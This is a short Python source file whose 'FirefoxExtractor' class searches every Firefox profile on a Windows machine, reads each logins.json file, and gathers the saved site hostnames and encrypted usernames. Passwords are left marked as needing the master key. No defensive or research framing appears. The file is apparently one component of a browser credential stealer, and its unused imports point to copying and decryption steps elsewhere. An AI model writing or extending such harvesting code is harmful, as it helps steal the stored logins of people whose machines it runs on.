import os
import json
import sqlite3
import shutil
import ctypes

class FirefoxExtractor:
    def __init__(self):
        self.profiles_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")

    def extract_passwords(self):
        results = []
        if not os.path.exists(self.profiles_path):
            return []

        for profile in os.scandir(self.profiles_path):
            if profile.is_dir():
                logins_path = os.path.join(profile.path, "logins.json")
                if os.path.exists(logins_path):
                    try:
                        with open(logins_path, "r") as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get("logins", []):
                            results.append({
                                "browser": f"Firefox ({profile.name})",
                                "url": login.get("hostname"),
                                "user": login.get("encryptedUsername"), # Encrypted
                                "password": "Encrypted (Firefox Master Key required)"
                            })
                    except Exception as e:
                        print(f"Error reading Firefox profile {profile.name}: {e}")
        return results
